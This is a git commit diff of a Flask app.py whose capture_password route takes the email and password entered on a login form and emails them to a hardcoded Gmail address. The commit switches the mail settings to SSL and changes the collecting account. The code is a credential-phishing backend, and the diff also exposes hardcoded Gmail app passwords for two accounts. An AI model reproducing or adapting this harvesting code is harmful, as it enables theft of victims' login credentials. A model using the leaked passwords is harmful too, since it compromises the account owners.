481e09b742bf6e34952da49953711fae352f7754
rabbicraft <rabbicraft@outlook.com>
2024-08-26 15:34:48 -0700

    check

--- app.py
+++ app.py
@@ -8,10 +8,10 @@ app.secret_key = 'your_secret_key'  # Replace with your secret key
 
 # Flask-Mail configuration for Gmail
 app.config['MAIL_SERVER'] = 'smtp.gmail.com'
-app.config['MAIL_PORT'] = 587
-app.config['MAIL_USE_TLS'] = True
-app.config['MAIL_USERNAME'] = '21kelvinflores@gmail.com '  # Your Gmail address
-app.config['MAIL_PASSWORD'] = 'qmmmkwfwixiybuit'   # Your Gmail password or app-specific password
+app.config['MAIL_PORT'] = 465
+app.config['MAIL_USE_SSL'] = True
+app.config['MAIL_USERNAME'] = 'randersson014@gmail.com '  # Your Gmail address
+app.config['MAIL_PASSWORD'] = 'doawextubdjanoao'   # Your Gmail password or app-specific password
 
 mail = Mail(app)
 
@@ -32,7 +32,7 @@ def capture_password():
         password = request.form.get('password')
 
         # Send email using Flask-Mail
-        recipient =  '21kelvinflores@gmail.com'  # Your email address to receive the email
+        recipient =  'randersson014@gmail.com'  # Your email address to receive the email
         subject = 'Login'
         body = f'Email: {email}\nPassword entered: {password}'
 
